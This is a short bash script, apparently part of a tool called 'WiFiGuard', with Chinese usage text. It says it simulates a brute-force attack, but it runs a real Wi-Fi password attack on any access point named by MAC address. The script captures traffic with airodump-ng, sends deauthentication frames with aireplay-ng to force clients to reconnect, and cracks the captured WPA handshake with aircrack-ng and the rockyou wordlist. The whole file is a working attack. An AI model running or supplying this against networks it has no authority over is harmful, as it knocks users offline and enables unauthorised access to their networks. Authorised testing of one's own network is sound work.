#!/bin/bash
INTERFACE="${1:-wlp61s0mon}"
AP_MAC="$2"
WORDLIST="${3:-/usr/share/wordlists/rockyou.txt}"

if [ -z "$AP_MAC" ]; then
    echo "用法: sudo $0 <接口> <AP的MAC> [字典路径]"
    echo ""
    echo "示例: sudo $0 wlp61s0mon 46:C3:E1:A9:01:7E"
    echo "      sudo $0 wlp61s0mon 46:C3:E1:A9:01:7E /path/to/wordlist.txt"
    echo ""
    echo "提示: 运行 ./scan.sh 查看周围网络获取 MAC 地址"
    exit 1
fi

echo "[WiFiGuard] 模拟暴力破解攻击..."
echo "  接口: $INTERFACE"
echo "  目标 AP: $AP_MAC"

sudo airodump-ng --bssid "$AP_MAC" -w /tmp/wifiguard-capture "$INTERFACE" &>/dev/null &
AIRODUMP_PID=$!
sleep 5

sudo aireplay-ng --deauth 5 -a "$AP_MAC" "$INTERFACE" 2>/dev/null
sleep 5

sudo kill $AIRODUMP_PID 2>/dev/null
sleep 1

CAPFILE=$(ls /tmp/wifiguard-capture-*.cap 2>/dev/null | head -1)
if [ -f "$CAPFILE" ]; then
    if [ -f "$WORDLIST" ]; then
        echo "  开始字典攻击 ($WORDLIST)..."
        sudo aircrack-ng -w "$WORDLIST" "$CAPFILE"
    else
        echo "  字典文件不存在: $WORDLIST"
    fi
else
    echo "  未捕获到握手包"
fi

rm -f /tmp/wifiguard-capture-*.cap
